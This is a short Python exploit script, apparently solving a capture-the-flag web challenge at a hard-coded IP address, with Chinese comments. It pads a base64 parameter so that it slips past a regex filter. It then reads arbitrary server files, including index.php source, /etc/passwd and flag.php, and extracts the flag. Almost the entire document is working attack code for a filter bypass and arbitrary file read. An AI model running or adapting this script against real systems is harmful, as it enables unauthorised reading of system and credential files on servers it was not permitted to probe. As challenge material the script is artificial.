import base64, re, urllib.request, urllib.parse
BASE = "http://160.202.254.160:10986/"
KEY = re.compile(r"Yeedo|wants|a|girl|friend|or|flag", re.I)

def build_zero(path):
    z = base64.b64encode(path.encode()).decode()
    if KEY.search(z) and ".." not in z and "flag" not in z.lower():
        return z
    return z + "a"          # 追加在 == 之后，正则命中且解码不变

def fetch(path):
    q = urllib.parse.urlencode({"zero": build_zero(path), "first": "|.php"})
    url = BASE + "?" + q
    proxy = {"http": "http://127.0.0.1:12001", "https": "http://127.0.0.1:12001"}
    opener = urllib.request.build_opener(urllib.request.ProxyHandler(proxy))
    with opener.open(url, timeout=15) as r:
        return url, r.read().decode("utf-8", "replace")

print("[1] 首页源码泄漏验证")
_, home = fetch("/var/www/html/index.php")
print("    index.php 回显长度 =", len(home))
print("    含 highlight_file =", "highlight_file" in home)

print("[2] 路径遍历 + 绝对路径读取")
for p in ["/etc/passwd", "/var/www/html/flag.php"]:
    url, body = fetch(p)
    hit = "flag{" in body
    print("    %-26s len=%-5d flag命中=%s" % (p, len(body), hit))
    if hit:
        m = re.search(r"flag\{[0-9a-fA-F]+\}", body)
        print("    URL   :", url)
        print("    BODY  :", body.strip()[:120])
        print("    FLAG  :", m.group(0) if m else "未匹配")
